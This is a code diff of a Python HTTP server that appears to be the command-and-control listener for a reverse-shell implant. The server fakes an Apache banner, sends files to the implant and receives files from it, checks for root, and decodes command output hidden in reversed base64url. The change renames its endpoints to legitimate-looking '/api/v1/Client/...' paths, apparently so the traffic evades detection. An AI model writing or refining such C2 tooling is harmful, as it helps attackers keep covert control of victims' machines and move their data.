@@ -81,7 +81,7 @@ class MyServer(BaseHTTPRequestHandler):
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
-            if self.path == "/api/download":
+            if self.path == "/api/v1/Client/Download":
                 with open(local_path, "rb") as file:
                     file_content = file.read()
                     encoded_file = "File: "
@@ -90,7 +90,7 @@ class MyServer(BaseHTTPRequestHandler):
                     self.wfile.write(encoded_file.encode("utf-8"))
                     return
 
-            elif self.path == "/api/token":
+            elif self.path == "/api/v1/Client/Token":
                 while True:
                     if root:
                         whoami = "root"
@@ -237,17 +237,17 @@ class MyServer(BaseHTTPRequestHandler):
             else:
                 decoded_payload = self.decode_reversed_base64url(encoded_payload)
 
-            if self.path == "/api/info":
+            if self.path == "/api/v1/Client/Info":
                 self.wfile.write(response.encode())
 
-            elif self.path == "/api/upload":
+            elif self.path == "/api/v1/Client/Upload":
                 with open(local_path, "wb") as f:
                     file_content = self.decode_file_revbase64url(encoded_payload)
                     f.write(file_content)
                     self.wfile.write(response.encode())
                 return
 
-            elif self.path == "/api/debug":
+            elif self.path == "/api/v1/Client/Debug":
                 if not first_run and command is not None:
                     if decoded_payload == "" or not decoded_payload:
                         print()
@@ -274,7 +274,7 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                 self.wfile.write(response.encode())
 
-            elif self.path == "/api/error":
+            elif self.path == "/api/v1/Client/Error":
                 if not first_run and command is not None:
                     if decoded_payload == "" or not decoded_payload:
                         print()
